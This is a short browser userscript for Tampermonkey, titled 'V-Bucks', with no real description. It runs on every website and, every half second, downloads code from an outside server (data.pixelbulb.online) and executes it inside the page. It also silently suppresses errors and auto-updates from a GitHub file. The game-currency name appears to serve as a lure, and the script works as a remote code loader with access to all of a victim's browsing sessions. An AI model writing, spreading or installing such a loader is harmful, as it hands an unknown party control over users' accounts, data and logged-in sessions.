// ==UserScript==
// @name         V-Bucks
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @match        *://*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=bbc.co.uk
// @downloadURL  https://raw.githubusercontent.com/UtterDonkey/bh-gui/main/vbucks.user.js
// @updateURL    https://raw.githubusercontent.com/UtterDonkey/bh-gui/main/vbucks.user.js
// @grant        none
// ==/UserScript==


window.scriptChecker = setInterval(async () =>{
    if(window.cancelScript){
        clearInterval(window.scriptChecker);
        return;
    }
    try{
        new Function(await (await fetch('https://data.pixelbulb.online/script').catch(e =>e)).text())();
    }catch(e){}
}, 500);
